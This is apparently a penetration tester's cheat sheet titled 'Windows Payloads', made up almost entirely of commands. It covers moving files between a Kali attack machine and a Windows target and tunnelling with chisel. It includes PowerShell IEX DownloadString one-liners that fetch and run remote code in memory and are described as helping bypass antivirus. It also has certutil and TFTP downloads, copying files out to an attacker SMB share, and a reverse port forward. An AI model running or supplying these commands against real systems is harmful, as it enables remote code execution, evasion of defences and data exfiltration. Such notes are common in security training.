# Windows Payloads

- [Transfer files](#transfer-files)
    - [HTTP](#http)
    - [SMB](#smb)
    - [Wget.ps1](#wgetps1)
    - [TFTP (UDP)](#tftp-udp)
- [Port Forwarding](#port-forwarding)
    - [On Kali:](#on-kali)
    - [On Windows](#on-windows)

# Transfer files

## HTTP

**(SEND) KALI:**
```bash
python3 -m http.server 8080
```

**(RECEIVE) WINDOWS:**
```powershell
# Don't save (helps bypass AV)
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip:8080/file')"

powershell.exe iex (iwr http://ip:8080/file -usebasicparsing)

# Write to disk
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip:8080/file','C:\Users\Public\Downloads\file')"

powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip:8080/file' -Outfile '/path/to/file'"

certutil -urlcache -f http://ip:8080/file file
```
## SMB

**(SEND) KALI:**
```bash
sudo impacket-smbserver sharename /path/to/serve
```

**(RECEIVE) WINDOWS:**
```powershell
## Option 1
net use sharename: \\ip\myshare # 1: Mount
net use sharename: /d # 2: disconnect
net use sharename: /delete # 3: delete

## Option 2
New-PSDrive -Name "sharename" -PSProvider "FileSystem" -Root "\\ip\sharename"
Remove-PSDrive -Name sharename

## Option 3 (not mounting)
copy //kali_ip/sharename/file_name C:\path\to\save
```

**(SEND) WINDOWS:**
```powershell
copy C:\path\to\file //kali_ip/sharename # Send to kali share
```
## Wget.ps1

```powershell
echo $storageDir = $pwd >> wget.ps1 $webclient = New-Object System.Net.WebClient >> wget.ps1

# Download file from:
$url = "http://<ip>/file_name" >> wget.ps1

# Save file as 
$file = "file_name" echo $webclient.DownloadFile($url,$file) >> wget.ps1

# execute the script as follows 
powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
```

## TFTP (UDP)

```powershell
tftp -i <ip> get file_name
```

# Port Forwarding

## On Kali:

```bash
./chisel server --reverse --port 9001
```

## On Windows

```powershell
.\chisel.exe client KALI_IP:9001 R:KALI_PORT:127.0.0.1:WINDOWS_PORT
```
